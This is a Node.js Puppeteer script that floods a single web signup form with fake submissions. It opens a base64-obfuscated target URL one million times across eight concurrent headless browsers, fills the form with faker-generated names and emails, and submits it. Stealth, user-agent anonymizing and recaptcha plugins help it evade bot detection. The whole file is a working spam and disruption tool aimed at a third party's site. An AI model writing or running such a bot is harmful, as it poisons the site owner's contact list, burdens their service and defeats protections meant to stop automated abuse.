const faker = require('faker');
const {
    Cluster
} = require('puppeteer-cluster')
const vanillaPuppeteer = require('puppeteer')
const txtgen = require('txtgen');
const {
    addExtra
} = require('puppeteer-extra')
const Stealth = require('puppeteer-extra-plugin-stealth')
const Recaptcha = require('puppeteer-extra-plugin-recaptcha');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker')
const {
    fake
} = require('faker');
const userAgent = require('user-agents');
const publicIp = require('public-ip');


async function main() {
    // Create a custom puppeteer-extra instance using `addExtra`,
    // so we could create additional ones with different plugin config.
    const puppeteer = addExtra(vanillaPuppeteer)
    puppeteer.use(Stealth())
    puppeteer.use(AdblockerPlugin({
        blockTrackers: true
    }))
    puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')())
    puppeteer.use(require('puppeteer-extra-plugin-block-resources')({
        blockedTypes: new Set(['image', 'stylesheet', 'media'])
    }))

    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 8,
        timeout: 30000,
        puppeteerOptions: {
            headless: true
        }
    });
    // Event handler to be called in case of problems
    cluster.on('taskerror', (err, data) => {
        console.log(`Exception in ${data}: ${err.message}`);
    });

    await cluster.task(async ({
                                  page,
                                  data: url
                              }) => {
        await page.setRequestInterception(true);
        page.on('request', (req) => {
            if (req.resourceType() === 'image') {
                req.abort();
            } else {
                req.continue();
            }
        });

        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 0
        });

        await page.waitForSelector("#tmp_button-51801-122-131-101")
        await page.evaluate(() => {
            document.querySelector('span.elButtonMain').click()
        });

        let firstName = faker.name.firstName();
        let email = faker.internet.email();

        await page.waitForSelector('#inf_field_FirstName');

        await page.type('#inf_field_FirstName', `${firstName}`);
        await page.type('#inf_field_Email', email);

        await page.click('#mainContent > table > tbody > tr > td > table > tbody > tr > td > div:nth-child(4) > div > button')
        console.log(`Contact Form Submitted: ${firstName}: ${email}`);

        await page.waitForTimeout(1000)
        return `Contact Form Submitted: ${firstName}: ${email}`;
    });

    for (let i = 0; i < 1000000; i++) {
        cluster.queue(Buffer.from("aHR0cHM6Ly93d3cuYnJpYW5jaGEubWUvYWNtLTE1Mjg1NTUyNA==", 'base64').toString('binary'))

    }
    console.log(`Current Public IP: ${await publicIp.v4()}`)

    await cluster.idle();
    await cluster.close();
}

main().then(response => console.log(response));


async function autoScroll(page) {
    await page.evaluate(async () => {
        await new Promise((resolve, reject) => {
            var totalHeight = 0;
            var distance = 100;
            var timer = setInterval(() => {
                var scrollHeight = document.body.scrollHeight;
                window.scrollBy(0, distance);
                totalHeight += distance;

                if (totalHeight >= scrollHeight) {
                    clearInterval(timer);
                    resolve();
                }
            }, 100);
        });
    });
}